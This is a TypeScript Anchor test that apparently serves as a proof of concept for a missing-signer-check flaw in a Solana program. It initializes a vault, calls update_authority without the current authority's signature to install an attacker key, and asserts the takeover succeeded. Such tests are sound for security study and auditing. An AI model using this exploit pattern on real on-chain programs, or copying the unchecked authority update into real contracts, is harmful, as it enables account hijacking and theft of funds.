import * as anchor from "@coral-xyz/anchor";
import { expect } from "chai";
import fs from "fs";
import path from "path";
import {
  Connection,
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

const PROGRAM_ID = new PublicKey(
  "EUFqStpHaAdFnLVpfykXhvah1obeh6suB9XeFU9DTxdU"
);

function pubkeyToBuffer(pk: PublicKey): Buffer {
  return Buffer.from(pk.toBytes());
}

describe("missing-signer-check", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const connection: Connection = provider.connection;

  const idlPath = path.join(
    __dirname,
    "../target/idl/missing_signer_check.json"
  );
  const idl = JSON.parse(fs.readFileSync(idlPath, "utf8"));

  const initDisc: number[] = idl.instructions.find(
    (i: any) => i.name === "initialize"
  ).discriminator;
  const updateDisc: number[] = idl.instructions.find(
    (i: any) => i.name === "update_authority"
  ).discriminator;

  it("confirms missing signer check exploit", async () => {
    const payer = (provider.wallet as any).payer as Keypair;
    const vault = Keypair.generate();
    const attacker = Keypair.generate();

    // Initialize vault with payer as authority
    {
      const data = Buffer.concat([
        Buffer.from(initDisc),
        pubkeyToBuffer(payer.publicKey),
      ]);
      const ix = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
          { pubkey: vault.publicKey, isSigner: true, isWritable: true },
          { pubkey: payer.publicKey, isSigner: true, isWritable: true },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data,
      });
      const tx = new Transaction().add(ix);
      await sendAndConfirmTransaction(connection, tx, [payer, vault], {
        commitment: "confirmed",
      });
    }

    // Read authority before (offset 8..40)
    const beforeInfo = await connection.getAccountInfo(vault.publicKey);
    if (!beforeInfo) throw new Error("vault not created");
    const authorityBefore = new PublicKey(beforeInfo.data.subarray(8, 40));

    // Exploit: update_authority without old authority signing
    let exploitSig = "";
    {
      const data = Buffer.concat([
        Buffer.from(updateDisc),
        pubkeyToBuffer(attacker.publicKey),
      ]);
      const ix = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
          { pubkey: vault.publicKey, isSigner: false, isWritable: true },
          { pubkey: authorityBefore, isSigner: false, isWritable: false },
        ],
        data,
      });
      const tx = new Transaction().add(ix);
      exploitSig = await sendAndConfirmTransaction(connection, tx, [payer], {
        commitment: "confirmed",
      });
    }

    const afterInfo = await connection.getAccountInfo(vault.publicKey);
    if (!afterInfo) throw new Error("vault missing after exploit");
    const authorityAfter = new PublicKey(afterInfo.data.subarray(8, 40));

    console.log("Exploit tx:", exploitSig);
    console.log("Authority before:", authorityBefore.toBase58());
    console.log("Authority after:", authorityAfter.toBase58());

    try {
      const tx = await connection.getTransaction(exploitSig, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      } as any);
      if (tx?.meta?.logMessages) {
        console.log("Transaction logs:");
        for (const line of tx.meta.logMessages) console.log(line);
      }
    } catch {}

    expect(authorityAfter.toBase58()).to.equal(attacker.publicKey.toBase58());
  });
});
